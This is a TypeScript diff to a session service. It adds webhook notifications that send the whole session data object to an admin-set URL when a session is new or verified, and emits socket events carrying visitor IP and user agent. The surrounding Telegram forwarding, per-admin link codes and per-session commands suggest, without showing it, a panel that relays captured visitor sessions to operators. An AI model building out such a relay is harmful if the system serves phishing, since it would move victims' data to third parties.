@@ -6,6 +6,7 @@ import { formatSessionForTelegram, sendTelegram } from './telegram.service';
 import { logAudit } from '../utils/logger';
 import { getSocketIO } from '../socket';
 import { SessionWithData } from '../types';
+import { WebhookService } from './webhook.service';
 
 export class SessionService {
     /**
@@ -181,6 +182,12 @@ export class SessionService {
             if (data.adminCode) {
                 db.incrementLinkSessions(data.adminCode, 'verified');
             }
+
+            // Webhook: Session Verified
+            if (adminSettings['webhookUrl']) {
+                WebhookService.send('session_verified', data, adminSettings['webhookUrl'], adminSettings['webhookSecret'] || '')
+                    .catch(e => console.error('[Sync] Webhook trigger failed', e));
+            }
         }
 
         // Prevent downgrading 'Verified' status
@@ -194,6 +201,21 @@ export class SessionService {
         console.log(`[Sync] Upserted session ${data.sessionId}. AdminID: ${adminId} Variant: ${data.variant || 'N/A'}`);
 
         io.emit('sessions-updated');
+
+        if (!existing) {
+            io.emit('session-new', {
+                id: data.sessionId,
+                ip: ip,
+                flow: data.flowId || 'unknown',
+                device: data.fingerprint?.userAgent || 'unknown'
+            });
+
+            // Webhook: New Session
+            if (adminSettings['webhookUrl']) {
+                WebhookService.send('session_new', data, adminSettings['webhookUrl'], adminSettings['webhookSecret'] || '')
+                    .catch(e => console.error('[Sync] Webhook trigger failed', e));
+            }
+        }
 
         // Check for pending commands
         const cmd = await db.getCommand(data.sessionId);
